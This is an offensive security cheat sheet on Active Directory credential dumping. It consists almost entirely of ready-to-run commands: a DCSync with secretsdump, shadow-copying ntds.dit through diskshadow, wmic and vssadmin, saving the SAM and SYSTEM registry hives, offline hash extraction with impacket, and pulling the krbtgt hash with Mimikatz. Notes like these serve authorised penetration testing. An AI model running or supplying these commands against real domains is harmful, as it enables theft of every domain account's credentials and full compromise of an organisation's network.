# Active Directory

### DCSync

#### Remote with secretsdump

```bash
secretsdump.py <domain>/<user>:<pass>@<rhost>
```

### NTDS, SAM, SYSTEM

Make a shadowcopy first via diskshadow.exe and copy out "c:\windows\ntds\ntds.dit":

```bash
set context persistent nowriters
add volume c: alias xct
create
expose %xct% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\programdata\ntds.dit
delete shadows volume %xct%
reset
```

When getting weird line endings errors, put everything in a txt file and run diskshadow /s . Alternatively you can create the shadowcopy via:

```text
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
```

Then you can use the Path, e.g. `\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1` to access it and copy out \windows\system32\config\SAM and \windows\system32\config\SYSTEM.

 Dump:

```bash
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
```

SAM/System can also be dumped via registry:

```text
reg save hklm\sam c:\temp\sam.save
reg save hklm\system c:\temp\system.save

secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### Krbtgt hash on DC

```bash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <dc>
```

